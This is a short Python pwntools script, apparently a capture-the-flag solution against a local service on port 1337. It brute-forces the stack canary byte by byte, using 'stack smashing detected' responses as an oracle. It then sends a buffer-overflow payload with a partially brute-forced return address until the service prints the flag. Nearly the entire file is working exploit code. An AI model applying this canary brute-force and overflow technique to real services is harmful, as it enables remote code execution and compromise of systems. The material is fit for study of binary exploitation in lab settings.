#!/usr/bin/python3
from pwn import *
from time import sleep

'''This is kinda sloppy, sorry'''

context.log_level = "critical"
pack=make_packer("all")

def exploit(canary):
    tries = 0
    val = 0xbd
    xal = 0x00
    while True:
        xal += 0x01 << 8
        
        shellcode = bytes.fromhex("41" * 56)
        shellcode += pack(canary)
        shellcode += bytes.fromhex("41" * 8)
        shellcode += pack(xal + val)
        size = bytes(str(int(len(shellcode))),encoding="utf-8")

        p = remote("127.0.0.1", 1337)
        p.recv()
        p.sendline(size)
        p.recv()
        p.sendline(shellcode)
        p.recvuntil(b"Goodbye!")
        x = p.recv()
        if b"flag" in x:
            print("[+] exploited in tries =", tries)
            print(x.decode())
            p.close()
            break
        else:
            tries += 1
        p.close()

def brute_can():
    b = 0
    count = 1
    while True:
        if count == 8:
            print("[+] canary:", hex(b))
            exploit(b)
            break
        b += (0x01 << (8*count))
        resp = runner(pack(b), b"stack")
        if resp != None:
            print(f"DEBUG: {hex(b)}")
            count += 1

def runner(payload, check):
    p = remote("127.0.0.1", 1337)
    shellcode = bytes.fromhex("41" * 56)
    shellcode += payload
    size = bytes(str(int(len(shellcode))),encoding="utf-8")
    
    p.recv()
    p.sendline(size)
    p.recv()
    p.sendline(shellcode)
    p.recvuntil(b"Goodbye!\n")
    x = p.recvline(timeout=1)
    if b"stack smashing detected" in x:
        return None
        p.close()
    else:
        return "radarada"
        p.close()
    
brute_can()
